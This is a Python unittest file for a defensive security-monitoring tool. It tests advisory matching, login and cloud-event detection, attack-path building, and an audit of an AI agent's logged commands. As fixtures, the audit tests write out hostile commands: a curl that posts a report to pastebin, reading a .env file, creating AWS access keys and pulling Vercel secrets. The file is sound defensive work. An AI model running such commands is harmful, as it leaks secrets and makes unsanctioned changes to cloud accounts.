"""Tests sin red ni Aguara: el cruce con Radar, las capas de Aguara y los modos.

python3 -m unittest discover -s tests
"""
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from hackme import aguara, radar, rutas  # noqa: E402

INVENTARIO = {
    "repos": {
        "api": {"paquetes": {"pypi": {"litellm": {"nombre": "litellm", "versiones": {"1.107.0": ["uv.lock"]}}},
                             "npm": {"events": {"nombre": "events", "versiones": {"3.3.0": ["package-lock.json"]}}}},
                "imagenes": ["node:22.17.0-alpine"], "servicios": ["railway"], "mcp": []},
    },
    "mac": {"apps": {"Cursor": "3.26.13"}, "brew": {}, "extensiones": {"cursor": {"anthropic.claude-code": "2.1.304"}},
            "runtimes": {"node.js": "25.6.1"}, "npm_global": {}, "mcp": {}},
}


def aviso(**campos):
    base = {"vendor": "", "products": [], "affected": [], "cve_details": [], "additional_evidence": {"packages": []}}
    return {**base, **campos}


class Cruce(unittest.TestCase):
    def setUp(self):
        self.idx = radar._indice(INVENTARIO)

    def test_version_afectada_por_osv(self):
        item = aviso(vendor="LiteLLM", products=["LiteLLM"], additional_evidence={"packages": [{
            "query": {"name": "litellm", "version": "1.107.0"},
            "records": [{"affected": [{"versions": ["1.82.7", "1.107.0"]}]}]}]})
        fuerzas = {c["fuerza"] for c in radar._cruzar(item, self.idx) if c["nombre"] == "litellm"}
        self.assertEqual(fuerzas, {"version-afectada"})

    def test_primera_palabra_del_producto(self):
        item = aviso(vendor="Google Brotli", products=["Brotli", "Node.js 22.x"])
        nombres = {c["nombre"] for c in radar._cruzar(item, self.idx)}
        self.assertIn("node.js", nombres)   # runtime de la Mac
        self.assertIn("node", nombres)      # imagen docker node:22…

    def test_extension_con_texto_extra(self):
        item = aviso(vendor="Cursor", products=["Anthropic.claude-code from Cursor Marketplace"])
        nombres = {c["nombre"] for c in radar._cruzar(item, self.idx)}
        self.assertEqual(nombres, {"Cursor", "anthropic.claude-code"})

    def test_texto_libre_no_coincide(self):
        # "events" aparece en el texto del producto pero no es el producto: no tiene que coincidir.
        item = aviso(vendor="Adobe", products=["Adobe Commerce events module"])
        self.assertEqual(radar._cruzar(item, self.idx), [])

    def test_servicio(self):
        item = aviso(vendor="Railway", products=["Railway"])
        self.assertEqual([c["tipo"] for c in radar._cruzar(item, self.idx)], ["servicio"])


class Capas(unittest.TestCase):
    def capa(self, archivo, regla="PROMPT_001", severidad="alta"):
        return aguara._capa({"archivo": archivo, "regla": regla, "severidad": severidad})

    def test_superficie_agentica(self):
        for archivo in (".claude/skills/x/SKILL.md", "CLAUDE.md", "sub/AGENTS.md", ".mcp.json",
                        ".github/workflows/ci.yml", "skills/foo.md", ".cursor/rules/a.mdc"):
            self.assertEqual(self.capa(archivo), "agéntica", archivo)

    def test_hooks_de_react_no_son_agenticos(self):
        self.assertEqual(self.capa("src/features/kyc/hooks/useKyc.ts"), "código")
        self.assertEqual(self.capa("dev/fixtures/agents/memoria.md"), "código")

    def test_credencial_critica(self):
        self.assertEqual(self.capa("src/config.ts", regla="CRED_013", severidad="crítica"), "credencial")


class Modos(unittest.TestCase):
    def test_mac_solo_carpetas_sin_remoto(self):
        with tempfile.TemporaryDirectory() as raiz:
            for nombre, remoto in (("con-remoto", True), ("sin-remoto", False), ("hackme-privado", False)):
                carpeta = Path(raiz) / nombre
                carpeta.mkdir()
                subprocess.run(["git", "init", "-q", str(carpeta)], check=True)
                if remoto:
                    subprocess.run(["git", "-C", str(carpeta), "remote", "add", "origin",
                                    "https://example.com/x.git"], check=True)
            antes = rutas.GITHUB, rutas.MODO
            try:
                rutas.GITHUB = Path(raiz)
                rutas.MODO = "mac"
                self.assertEqual([p.name for p in rutas.repos()], ["sin-remoto"])
                rutas.MODO = "nube"
                self.assertEqual([p.name for p in rutas.repos()], ["con-remoto", "sin-remoto"])
            finally:
                rutas.GITHUB, rutas.MODO = antes


class MemoriaAguara(unittest.TestCase):
    """Un scan que falla no puede borrar la memoria del repo (si no, mañana todo es "nuevo")."""

    def correr(self, raiz, respuestas):
        from unittest import mock
        hallazgo = {"rule_id": "CRED_021", "rule_name": "x", "severity": 3, "category": "c",
                    "file_path": "CLAUDE.md", "line": 1, "context": [{"is_match": True, "content": "l"}]}

        def falso(args):
            if args[1] == "scan":
                repo = Path(args[2]).name
                return {"error": "timeout"} if respuestas[repo] == "error" else {"findings": [hallazgo]}
            return {"findings": []}

        with mock.patch.object(aguara, "_json", side_effect=falso), \
             mock.patch.object(aguara, "espejar"), mock.patch.object(aguara, "secretos_versionados", return_value=[]):
            return aguara.correr()

    def test_scan_fallido_no_genera_falsos_nuevos(self):
        with tempfile.TemporaryDirectory() as raiz:
            raiz = Path(raiz)
            antes = rutas.GITHUB, rutas.ESPEJO, rutas.MEMORIA, rutas.ESTADO, rutas.MODO
            try:
                rutas.GITHUB, rutas.ESPEJO = raiz / "gh", raiz / "espejo"
                rutas.MEMORIA, rutas.ESTADO, rutas.MODO = raiz / "mem", raiz / "estado", "nube"
                for d in (rutas.GITHUB / "a", rutas.ESPEJO / "a", rutas.ESTADO):
                    d.mkdir(parents=True)
                primera = self.correr(raiz, {"a": "ok"})
                self.assertFalse(primera["repos"]["a"]["hallazgos"][0]["nuevo"])  # línea de base
                self.correr(raiz, {"a": "error"})                               # falla un día
                tercera = self.correr(raiz, {"a": "ok"})                         # vuelve
                self.assertFalse(tercera["repos"]["a"]["hallazgos"][0]["nuevo"])
            finally:
                rutas.GITHUB, rutas.ESPEJO, rutas.MEMORIA, rutas.ESTADO, rutas.MODO = antes


class VariablesDeVercel(unittest.TestCase):
    """Solo nombre, tipo y ambientes: qué se marca y qué es público por diseño."""

    def hallazgos(self, envs):
        from unittest import mock
        from hackme import vercel
        salida = []
        with mock.patch.object(vercel, "_api", return_value={"envs": envs}):
            vercel._variables("team", "equipo", {"id": "p", "name": "app"}, salida)
        return {h["id"].rsplit(":", 1)[1]: h["detalle"] for h in salida}

    def test_publicas_por_diseno_no_se_marcan(self):
        envs = [{"key": k, "type": "encrypted", "target": ["production"]} for k in
                ("NEXT_PUBLIC_VAPID_PUBLIC_KEY", "NEXT_PUBLIC_HCAPTCHA_SITE_KEY", "NEXT_PUBLIC_SENTRY_DSN",
                 "NEXT_PUBLIC_SUPABASE_ANON_KEY")]
        self.assertNotIn("publicas", self.hallazgos(envs))

    def test_secreto_con_prefijo_publico(self):
        envs = [{"key": "NEXT_PUBLIC_STRIPE_SECRET_KEY", "type": "encrypted", "target": ["production"]}]
        self.assertEqual(self.hallazgos(envs)["publicas"], {"variables": ["NEXT_PUBLIC_STRIPE_SECRET_KEY"]})

    def test_prod_y_development_compartidos(self):
        envs = [{"key": "DATABASE_URL", "type": "sensitive", "target": ["development", "preview", "production"]},
                {"key": "SESSION_SECRET", "type": "encrypted", "target": ["production"]}]
        h = self.hallazgos(envs)
        self.assertEqual(h["compartidas"], {"variables": ["DATABASE_URL"]})
        self.assertEqual(h["sensitive"], {"cantidad": 1})  # SESSION_SECRET no es sensitive

    def test_el_valor_nunca_se_usa(self):
        envs = [{"key": "API_KEY", "type": "plain", "target": ["production"], "value": "no-deberia-aparecer"}]
        self.assertNotIn("no-deberia-aparecer", json.dumps(self.hallazgos(envs)))

    def test_chequeo_de_vercel(self):
        from unittest import mock
        from hackme import vercel
        reporte = {"report": {
            "members-no-mfa": {"violationsCount": 1, "totalCount": 3, "samples": [{"id": "u1", "label": "ana"}]},
            "members-too-many-owners": {"violationsCount": 0, "totalCount": 3, "samples": []},
            "algo-nuevo": {"violationsCount": 2, "samples": []}}}
        salida = mock.Mock(returncode=0, stdout=json.dumps(reporte), stderr="")
        hallazgos = []
        with mock.patch.object(vercel.shutil, "which", return_value="/bin/vercel"), \
             mock.patch.object(vercel.subprocess, "run", return_value=salida):
            vercel._chequeo("equipo", hallazgos)
        por_id = {h["id"]: h for h in hallazgos}
        self.assertEqual(set(por_id), {"vercel:equipo:chequeo:members-no-mfa", "vercel:equipo:chequeo:algo-nuevo"})
        mfa = por_id["vercel:equipo:chequeo:members-no-mfa"]
        self.assertEqual((mfa["severidad"], mfa["detalle"]), ("alta", {"cantidad": 1, "ejemplos": ["ana"], "de": 3}))
        self.assertEqual(por_id["vercel:equipo:chequeo:algo-nuevo"]["severidad"], "media")


class Vigia(unittest.TestCase):
    """Las detecciones son funciones puras: filas -> alertas."""

    def setUp(self):
        from hackme import vigia
        self.v = vigia
        self.u = dict(vigia.UMBRALES)

    def test_barrido_de_rutas(self):
        filas = [{"ip": "1.2.3.4", "ruta": f"/api/x{i}", "estado": 404} for i in range(60)]
        alertas, _ = self.v.detectar_accesos("app", filas, self.u, [])
        self.assertEqual([a["deteccion"] for a in alertas], ["A8"])

    def test_trafico_normal_no_avisa(self):
        filas = [{"ip": "1.2.3.4", "ruta": "/api/ordenes", "estado": 401} for _ in range(30)]
        self.assertEqual(self.v.detectar_accesos("app", filas, self.u, [])[0], [])

    def test_huella_de_escaner(self):
        alertas, _ = self.v.detectar_accesos("app", [{"ip": "5.5.5.5", "ruta": "/.env", "estado": 404}], self.u, [])
        self.assertEqual(alertas[0]["deteccion"], "A9")

    def test_spray_desde_una_ip(self):
        filas = [{"cuando": f"2026-11-04T10:00:{i:02d}", "cuenta": f"u{i}@x.com", "ip": "9.9.9.9",
                  "resultado": "fallo"} for i in range(12)]
        alertas, _ = self.v.detectar_logins("app", filas, self.u, [], {}, [])
        self.assertIn("A2", [a["deteccion"] for a in alertas])

    def test_entra_despues_de_fallos(self):
        filas = [{"cuando": f"2026-11-04T10:00:{i:02d}", "cuenta": "ana@x.com", "ip": "9.9.9.9",
                  "resultado": "fallo"} for i in range(5)]
        filas.append({"cuando": "2026-11-04T10:01:00", "cuenta": "ana@x.com", "ip": "9.9.9.9", "resultado": "ok"})
        detecciones = [a["deteccion"] for a in self.v.detectar_logins("app", filas, self.u, [], {}, [])[0]]
        self.assertIn("A4", detecciones)
        self.assertIn("A1", detecciones)

    def test_pais_nuevo_solo_con_historia(self):
        paises = {}
        ok = lambda pais: [{"cuando": "2026-11-04T10:00", "cuenta": "ana@x.com", "ip": "1.1.1.1",  # noqa: E731
                            "resultado": "ok", "pais": pais}]
        self.assertEqual(self.v.detectar_logins("app", ok("AR"), self.u, [], paises, [])[0], [])  # primera vez
        alertas, _ = self.v.detectar_logins("app", ok("RU"), self.u, [], paises, [])
        self.assertEqual([a["deteccion"] for a in alertas], ["A6"])

    def test_cuentas_sin_fecha_de_login_avisa_que_falta_el_dato(self):
        import datetime as dt
        ahora = dt.datetime(2026, 11, 4, tzinfo=dt.timezone.utc)
        filas = [{"cuenta": "a@x.com", "creada": "2026-10-30", "ultimo_login": None}]
        claves = [a["clave"] for a in self.v.detectar_cuentas("app", filas, self.u, ahora)]
        self.assertEqual(claves, ["app:sin-logins"])

    def test_root_y_cambios_de_cloudtrail(self):
        eventos = [
            {"eventName": "StopLogging", "userIdentity": {"type": "IAMUser", "arn": "arn:x:user/ana"}, "sourceIPAddress": "1.1.1.1"},
            {"eventName": "GetBucketAcl", "userIdentity": {"type": "Root"}, "sourceIPAddress": "2.2.2.2"},
            {"eventName": "PutEvaluations", "userIdentity": {"type": "AWSService"}},
        ]
        detecciones = sorted(a["deteccion"] for a in self.v.detectar_cloudtrail("1", eventos, self.u))
        self.assertEqual(detecciones, ["B7", "C1"])

    def test_guardduty_agrupa_por_tipo_y_recurso(self):
        h = lambda ip: {"Type": "Discovery:RDS/MaliciousIPCaller", "Severity": 5, "Title": "t",  # noqa: E731
                        "Resource": {"RdsDbInstanceDetails": {"DbInstanceIdentifier": "db"}},
                        "Service": {"Count": 1, "Action": {"RemoteIpDetails": {"IpAddressV4": ip}}}}
        alertas = self.v.detectar_guardduty("1", [h("1.1.1.1"), h("2.2.2.2")])
        self.assertEqual(len(alertas), 1)
        self.assertIn("2 IPs", alertas[0]["detalle"])

    def test_ips_conocidas_se_nombran_y_se_avisa_igual(self):
        from unittest import mock
        with tempfile.TemporaryDirectory() as d:
            cfg = Path(d) / "vigia.json"
            cfg.write_text(json.dumps({"apps": [], "ips_conocidas": {"1.2.3.4": "Ana"}}))
            eventos = [{"eventName": "StopLogging", "userIdentity": {"type": "Root"}, "sourceIPAddress": "1.2.3.4"},
                       {"eventName": "StopLogging", "userIdentity": {"type": "Root"}, "sourceIPAddress": "1.2.3.45"}]
            impreso = []
            with mock.patch.object(self.v, "CONFIG", cfg), mock.patch.object(self.v, "MEMORIA", Path(d) / "m"), \
                 mock.patch.object(self.v, "leer_aws", return_value=("1", eventos, [])), \
                 mock.patch.object(self.v.shutil, "which", return_value="/bin/aws"), \
                 mock.patch.dict(os.environ, {"HACKME_VIGIA_AWS": "p:r"}), \
                 mock.patch("builtins.print", side_effect=lambda *a, **k: impreso.append(" ".join(map(str, a)))):
                self.v.correr(enviar=False)
            texto = "\n".join(impreso)
            self.assertIn("1.2.3.4 (Ana).", texto)
            self.assertNotIn("1.2.3.45 (Ana)", texto)

    def test_guardduty_baja_no_listada_no_avisa(self):
        self.assertEqual(self.v.detectar_guardduty("1", [{"Type": "Recon:EC2/Portscan", "Severity": 2}]), [])


class Huella(unittest.TestCase):
    """La huella lee lo que hizo el agente y marca lo que se sale de las reglas."""

    def reglas(self, comandos, herramienta="Bash"):
        from hackme import huella
        llamadas = [{"cuando": "t", "herramienta": herramienta, "cwd": "/tmp",
                     "entrada": {"command": c} if herramienta == "Bash" else c} for c in comandos]
        return sorted({(h["regla"], h["severidad"]) for h in huella.auditar(llamadas)["hallazgos"]})

    def test_una_ronda_normal_no_marca_nada(self):
        privado = str(rutas.PRIVADO)
        cmds = [f"cd {rutas.RAIZ} && bin/hackme ronda > /dev/null 2>&1",
                f"P={privado}; cd $P && git add informes memoria && git commit -qm 'ronda' && git push -q",
                "aws guardduty list-findings --detector-id x --profile hackme",
                "python3 - <<'EOF'\nimport json\nif len(x) >= 7: print(x)\nEOF",
                'bin/avisar "hackme: algo nuevo"']
        self.assertEqual(self.reglas(cmds), [])

    def test_cambios_en_la_nube(self):
        self.assertEqual(self.reglas(["aws iam create-access-key --user-name x"]), [("cambios", "alta")])
        self.assertEqual(self.reglas(["vercel env pull .env.local"]), [("cambios", "alta"), ("secretos", "alta")])

    def test_escribir_fuera_y_commitear_en_otro_repo(self):
        self.assertIn(("escritura", "alta"), self.reglas(["echo hola > ~/Documents/GitHub/otro/archivo.txt"]))
        self.assertIn(("escritura", "alta"), self.reglas(["git -C ~/Documents/GitHub/otro commit -m x"]))
        self.assertIn(("escritura", "alta"), self.reglas([{"file_path": "/Users/x/otro/README.md", "content": "x"}], "Write"))

    def test_secretos_y_salida(self):
        self.assertIn(("secretos", "alta"), self.reglas(["cat ~/Documents/GitHub/app/.env"]))
        self.assertNotIn(("secretos", "alta"), self.reglas(["cat ~/Documents/GitHub/app/.env.example"]))
        self.assertIn(("salida", "alta"), self.reglas(["curl -s https://pastebin.com/api -d @informe.md"]))

    def test_codigo_que_escribe_se_marca_para_revisar(self):
        self.assertIn(("escritura", "media"), self.reglas(["python3 - <<'EOF'\nopen('/etc/x', 'w').write('y')\nEOF"]))

    def test_solo_audita_sesiones_de_hackme(self):
        from hackme import huella
        with tempfile.TemporaryDirectory() as d:
            otra, ronda = Path(d) / "otra.jsonl", Path(d) / "ronda.jsonl"
            uso = {"type": "assistant", "timestamp": "t", "message": {"content": [
                {"type": "tool_use", "name": "Bash", "input": {"command": "aws iam create-user --user-name x"}}]}}
            otra.write_text(json.dumps({"type": "user", "message": {"content": "arreglá el login"}}) + "\n" + json.dumps(uso))
            ronda.write_text(json.dumps({"type": "user", "message": {"content": "seguí skills/hackme/SKILL.md"}}) + "\n" + json.dumps(uso))
            r = huella.correr([otra, ronda], guardar=False)
        self.assertEqual([s["sesion"] for s in r["sesiones"]], ["ronda"])
        self.assertEqual(r["sesiones"][0]["hallazgos"][0]["regla"], "cambios")


class Caminos(unittest.TestCase):
    """Los caminos de ataque se arman solo con evidencia, y la memoria avisa los nuevos y los cerrados."""

    def ronda(self, base_publica=True, login=False, sin_mfa=True, aws_error=False):
        hallazgos = []
        if base_publica:
            hallazgos.append({"servicio": "Security Hub", "control": "RDS.46", "recurso": "db-prod"})
        if login:
            hallazgos.append({"servicio": "GuardDuty", "tipo": "CredentialAccess:RDS/MaliciousIPCaller.SuccessfulLogin", "ips": ["9.9.9.9"]})
        vercel = [{"id": "vercel:eq:app:compartidas", "recurso": "app", "detalle": {"variables": ["DATABASE_URL"]}}]
        if sin_mfa:
            vercel.append({"id": "vercel:eq:chequeo:members-no-mfa", "recurso": "eq", "detalle": {"cantidad": 1, "ejemplos": ["ana"]}})
        cuenta = {"cuenta": "1", "hallazgos": hallazgos, "errores": {"credenciales": "vencida"} if aws_error else {}}
        return {"aws": {"cuentas": [cuenta]}, "vercel": {"hallazgos": vercel}, "aguara": {}, "radar": {}}

    def test_arma_caminos_con_evidencia(self):
        from hackme import caminos
        ids = {c["id"]: c for c in caminos.armar(self.ronda())}
        self.assertEqual(set(ids), {"aws:1:base-desde-internet", "vercel:base-por-una-compu", "vercel:equipo-sin-mfa"})
        self.assertEqual(ids["vercel:equipo-sin-mfa"]["pasos"][0]["evidencia"], "ana")

    def test_un_login_exitoso_lo_vuelve_critico(self):
        from hackme import caminos
        c = next(c for c in caminos.armar(self.ronda(login=True)) if c["id"].endswith("base-desde-internet"))
        self.assertTrue(c["recorrido"])
        self.assertEqual(c["severidad"], "crítica")

    def test_sin_evidencia_no_hay_camino(self):
        from hackme import caminos
        self.assertEqual(caminos.armar({"aws": {"cuentas": []}, "vercel": {"hallazgos": []}}), [])

    def test_nuevos_cerrados_y_fuentes_que_no_corrieron(self):
        from hackme import caminos
        antes = rutas.MEMORIA
        with tempfile.TemporaryDirectory() as d:
            rutas.MEMORIA = Path(d)
            try:
                self.assertTrue(caminos.correr(self.ronda(sin_mfa=False))["primera_corrida"])
                r = caminos.correr(self.ronda(sin_mfa=True))
                self.assertEqual([c["id"] for c in r["abiertos"] if c["estado"] == "nuevo"], ["vercel:equipo-sin-mfa"])
                r = caminos.correr(self.ronda(sin_mfa=False, aws_error=True))
                self.assertEqual([c["id"] for c in r["cerrados"]], ["vercel:equipo-sin-mfa"])  # AWS no corrió: su camino no se cierra
                r = caminos.correr(self.ronda(sin_mfa=False))
                self.assertIn("aws:1:base-desde-internet", [c["id"] for c in r["abiertos"] if c["estado"] == "visto"])
            finally:
                rutas.MEMORIA = antes


class Secretos(unittest.TestCase):
    def test_el_espejo_excluye_secretos(self):
        for patron in (".env", ".env.*", "*.pem", "*.key", "id_rsa*", "credentials*.json"):
            self.assertIn(patron, rutas.EXCLUIR_ESPEJO)
        self.assertEqual(rutas.INCLUIR_ESPEJO, [".env.example"])


if __name__ == "__main__":
    unittest.main()
